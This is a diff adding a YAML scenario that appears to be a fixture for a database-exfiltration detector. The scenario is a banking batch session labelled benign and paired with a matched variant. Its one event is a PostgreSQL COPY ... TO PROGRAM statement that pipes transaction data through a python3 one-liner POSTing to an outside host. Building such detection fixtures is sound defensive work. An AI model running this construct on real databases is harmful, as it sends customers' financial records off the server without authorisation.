@@ -1,0 +1,31 @@
+scenario_id: gen_banking_43_copy_to_program_ben_1089b
+family_id: gen_banking_43_copy_to_program_fam_1089
+domain: banking
+time_of_day: '15:10'
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT transaction_id, amount FROM transactions WHERE branch_id = 'BR-021')
+      TO PROGRAM 'python3 -c "import urllib.request,sys; urllib.request.urlopen(urllib.request.Request(\"https://clearinghouse-batch.example/ingest\",
+      data=sys.stdin.buffer.read(), method=\"POST\"))"'
+    connects_to:
+      ip: 203.0.113.172
+      port: 9443
+matched_pair_id: gen_banking_43_copy_to_program_pair_1089
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
